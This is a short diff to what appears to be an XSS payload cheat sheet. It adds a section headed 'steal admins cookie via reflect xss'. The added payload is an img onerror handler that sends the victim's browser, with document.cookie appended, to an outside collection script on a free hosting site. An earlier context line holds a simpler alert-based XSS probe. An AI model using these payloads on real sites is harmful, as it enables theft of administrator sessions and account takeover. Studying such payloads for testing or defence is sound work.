@@ -19,3 +19,7 @@ without quotes and semicolons
 without any space
 
 >"><img/src="x"/onerror=alert(99)>
+
+steal admins cookie via reflect xss
+
+><img src=x onerror=document.location='http://https://callmerat.000webhostapp.com/c.php?c='+document.cookie;'>
